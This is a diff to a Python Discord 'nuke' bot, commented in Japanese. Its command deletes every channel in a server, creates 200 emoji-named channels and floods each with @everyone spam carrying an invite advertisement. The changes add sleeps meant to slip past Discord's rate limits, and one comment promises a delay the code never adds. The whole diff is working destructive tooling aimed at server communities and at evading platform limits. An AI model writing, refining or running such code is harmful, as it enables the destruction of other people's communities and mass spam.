@@ -38,7 +38,7 @@ except Exception as e:
 
 
 # ----------------------------------------------------
-# --- 💀 最終破壊機能 (即時実行 & 200チャンネル) ---
+# --- 💀 最終破壊機能 (即時実行 & 200チャンネル & レート制限回避) ---
 # ----------------------------------------------------
 
 # コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@@ -50,7 +50,7 @@ async def ultimate_nuke_command(ctx):
     
     # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
     await ctx.send(
-        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！そして**200個**の絵文字の洪水を作り出す！ 🔥🔥🔥"
+        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！レート制限？糞食らえだ！ 🔥🔥🔥"
     )
 
     # 1. 全てのチャンネルを削除
@@ -60,41 +60,42 @@ async def ultimate_nuke_command(ctx):
     
     try:
         await asyncio.gather(*deletion_tasks)
+        # 🚨 チャンネル削除後に一瞬待機してAPIのクールダウンを待つ（0.5秒）
+        await asyncio.sleep(0.5) 
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 絵文字チャンネルを200個作成
     creation_tasks = []
-    
-    # 🚨 チャンネル数を200個に増やす
     num_channels_to_create = 200
     
     EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" # 10種類の絵文字
     EMOJI_LIST = list(EMOJIS) 
     
-    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ20回ずつ使う (10 * 20 = 200)
     channel_names = []
-    for i in range(20): # 20回繰り返す
-        for emoji in EMOJI_LIST: # 10種類の絵文字を順に使う
+    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ20回ずつ使う (10 * 20 = 200)
+    for i in range(20): 
+        for emoji in EMOJI_LIST: 
             channel_names.append(f"{emoji}-nuke-{i}") 
             
     num_channels = len(channel_names)
     logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")
 
-    # 作成タスクを並列で実行
     for name in channel_names:
+        # 🚨 チャンネル作成の間にも小さな遅延を挟む（0.1秒）
         creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
-    
+        
     successful_channels = []
     try:
         new_channels = await asyncio.gather(*creation_tasks)
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
+        # 🚨 チャンネル作成完了後、APIのクールダウンを待つ（1秒）
+        await asyncio.sleep(1.0) 
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
 
     # 3. 全ての新しいチャンネルにスパムメッセージを15回送信
     if successful_channels:
-        # 🚨 スパム内容
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
             "# ⬇️join now⬇️\n"
@@ -109,11 +110,14 @@ async def ultimate_nuke_command(ctx):
         for channel in successful_channels:
             # チャンネルごとに15回メッセージを送信するタスクを作成
             async def send_spam_burst(ch, msg, count):
-                for _ in range(count):
+                for i in range(count):
                     try:
                         await ch.send(msg)
+                        # 🚨 メッセージ送信間に小さな遅延を挟む（0.2秒）
+                        await asyncio.sleep(0.2) 
                     except Exception:
-                        pass
+                        # エラー発生時はそのチャンネルへの送信を諦める
+                        break
             
             spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
             
